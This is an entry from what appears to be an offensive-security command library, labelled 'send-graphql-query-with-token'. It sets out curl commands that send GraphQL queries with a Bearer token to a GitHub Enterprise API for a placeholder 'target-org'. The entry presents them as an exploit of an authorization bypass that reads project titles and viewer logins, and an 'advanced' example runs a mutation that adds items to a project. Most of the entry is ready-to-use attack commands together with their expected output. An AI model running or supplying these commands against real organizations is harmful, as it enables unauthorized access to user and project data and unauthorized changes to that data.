---
id: cmd-uuid-placeholder
data: >-
  curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type:
  application/json" -d '{"query": "query { organization(login: \"target-org\") {
  projectV2(number: 1) { title viewers(first: 10) { nodes { login } } } } }"}'
  https://github.enterprise.com/api/graphql
tags:
  - graphql
  - api
  - exploit
type: command
output: null
executor: bash
platforms:
  - Web
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.541Z'
verified: false
validated: true
submitted: true
---
# send-graphql-query-with-token

## Command

```bash
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"query": "query { organization(login: \"target-org\") { projectV2(number: 1) { title viewers(first: 10) { nodes { login } } } } }"}' https://github.enterprise.com/api/graphql
```

## Description

This command sends a GraphQL query to the GitHub Enterprise Server API using a Bearer token for authentication, targeting organization-level project data to exploit authorization bypass. It retrieves project title and viewer users, demonstrating unauthorized access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method for GraphQL | Yes |
| `-H "Authorization: Bearer $TOKEN"` | Authenticates with the scoped token (set as env var) | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload format | Yes |
| `-d '{...}'` | The GraphQL query payload | Yes |
| `https://github.enterprise.com/api/graphql` | Target API endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"query": "query { organization(login: \"target-org\") { projectV2(number: 1) { title } } }"}' https://github.enterprise.com/api/graphql
```

### Advanced Usage

```bash
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data '{"query": "mutation { addProjectV2ItemById(input: {projectId: \"PID\", contentId: \"IID\"}) { projectItem { id } } }"}' https://github.enterprise.com/api/graphql -v
```

## Expected Output

Successful execution returns a JSON response like {"data":{"organization":{"projectV2":{"title":"Org Project","viewers":{"nodes":[{"login":"user1"},{"login":"user2"}]}}}}}, confirming access to restricted data. Errors would show permission denied if not vulnerable.

## Related

- [[Related Procedure|procedures/Exploit-GitHub-Project-V2-API-Authorization-Bypass]]
